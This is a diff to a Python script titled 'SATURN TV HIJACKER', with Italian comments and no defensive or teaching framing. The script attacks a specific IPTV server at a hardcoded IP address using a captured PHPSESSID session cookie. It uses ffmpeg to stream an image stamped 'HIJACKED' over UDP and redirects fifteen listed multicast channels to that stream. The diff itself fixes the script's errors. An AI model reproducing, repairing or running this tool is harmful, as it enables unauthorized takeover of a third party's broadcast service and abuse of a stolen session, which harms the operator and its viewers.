@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+# SATURN TV HIJACKER - FIXED
 
 import subprocess
 import threading
@@ -7,6 +7,7 @@ import time
 import socket
 import requests
 import sys
+import os  # ← AGGIUNTO
 
 TARGET = "185.22.183.148:8085"
 COOKIE = "PHPSESSID=rk9a4s6ub06m8l1fei8jrmop02"
@@ -29,7 +30,7 @@ def start_udp_listener(port):
 def start_png_stream(ip, port, png):
     cmd = [
         'ffmpeg', '-stream_loop', '-1', '-loop', '1', '-i', png,
-        '-vf', f"scale=1280:720,drawtext=text='HIJACKED {ip}':fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf:fontsize=48:fontcolor=white@0.8:x=(w-text_w)/2:y=h-80",
+        '-vf', f"scale=1280:720,drawtext=text='HIJACKED {ip}':fontsize=48:fontcolor=white:x=(w-text_w)/2:y=h-80",
         '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-preset', 'ultrafast', '-tune', 'zerolatency',
         '-f', 'mpegts', f'udp://0.0.0.0:{port}'
     ]
@@ -54,11 +55,10 @@ def hijack_channel(ch_id, orig_source, ip):
 
 def main():
     if not os.path.exists(PNG_FILE):
-        print(f"ERRORE: {PNG_FILE} non trovato!")
+        print(f"ERRORE: {PNG_FILE} non trovato! Crea pat.png")
         sys.exit(1)
     
     ip = get_public_ip()
-    MALICIOUS_UDP = f"udp://{ip}:{UDP_PORT}"
     
     # THREADS
     threading.Thread(target=start_udp_listener, args=(UDP_PORT,), daemon=True).start()
@@ -66,7 +66,7 @@ def main():
     threading.Thread(target=start_png_stream, args=(ip, UDP_PORT, PNG_FILE), daemon=True).start()
     time.sleep(5)
     
-    # CANALI ESATTI DALLA DASHBOARD
+    # CANALI
     channels = [
         ("1", "udp://233.166.172.91:1234"),
         ("2", "udp://233.166.172.85:1234"),
@@ -83,16 +83,14 @@ def main():
         ("15", "udp://233.166.173.39:1234")
     ]
     
-    print("\n💥 HIJACK IN CORSO...")
+    print("\n💥 HIJACK...")
     for ch_id, orig_source in channels:
         hls = hijack_channel(ch_id, orig_source, ip)
-        time.sleep(1)  # Rate limit
+        time.sleep(1)
     
-    print("\n🎥 HLS OUTPUTS:")
+    print("\n🎥 HLS:")
     for ch_id, _ in channels:
         print(f"http://{TARGET}/media/hls_183_148/TRUSTEDF57_{ch_id}/playlist.m3u8")
-    
-    print("\n✅ TUTTO FATTO. APRI VLC.")
 
 if __name__ == "__main__":
     main()
